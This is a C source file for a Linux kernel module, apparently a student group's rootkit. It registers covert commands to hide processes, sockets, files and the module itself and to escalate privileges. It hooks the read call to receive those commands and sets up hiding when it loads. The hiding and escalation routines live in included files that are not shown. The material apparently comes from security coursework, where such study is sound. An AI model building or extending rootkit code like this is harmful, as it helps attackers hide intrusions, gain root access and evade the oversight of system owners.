#include <linux/module.h>    /* Needed by all modules */
#include <linux/kernel.h>    /* Needed for KERN_INFO */

#include "global.h"
#include "hook_read.h"
#include "covert_communication.h"
#include "hide_module.h"
#include "hide_processes.h"
#include "hide_sockets.h"
#include "hide_files.h"
#include "privilege_escalation.h"

void init_commands(void) {
    add_command("hideproc", hide_proc, 1);
    add_command("unhideproc", unhide_proc, 1);

    add_command("hidemodule", hide_module, 0);
    add_command("unhidemodule", unhide_module, 0);

    add_command("hidetcp", hideTCP, 1);
    add_command("hideudp", hideUDP, 1);
    add_command("unhidetcp", unhideTCP, 1);
    add_command("unhideudp", unhideUDP, 1);

    add_command("hidefiles", hide_files, 0);
    add_command("unhidefiles", unhide_files, 0);

    add_command("escalate", escalate, 0);
}

/* Initialization routine */
static int __init _init_module(void)
{
    printk(KERN_INFO "This is the kernel module of gruppe 6.\n");
    init_commands();
    hook_read(handle_input);
    OUR_DEBUG("Sockethiding initializer\n");
    load_sockethiding();
    OUR_DEBUG("Processhiding initializer.\n");
    load_processhiding();
    // needed to initialize the whole file hiding thingy
    OUR_DEBUG("Filehiding initializer.\n");
    hide_files();
    unhide_files();
    OUR_DEBUG("Initialisation complete.\n");
    return 0;
}

/* Exiting routine */
static void __exit _cleanup_module(void)
{
    //OUR_DEBUG("Unloading processhiding...\n");
    unload_processhiding();
    //OUR_DEBUG("Unloading sockethiding...\n");
    unload_sockethiding();
    //OUR_DEBUG("Unloading modulehiding...\n");
    unhide_module();
    //OUR_DEBUG("Unhooking read...\n");
    unhook_read();
    //OUR_DEBUG("Unhooking file hiding...\n");
    unhide_files();
    //OUR_DEBUG("Gruppe 6 says goodbye.\n");
    clear_commands();
}


/* Declare init and exit routines */
module_init(_init_module);
module_exit(_cleanup_module);
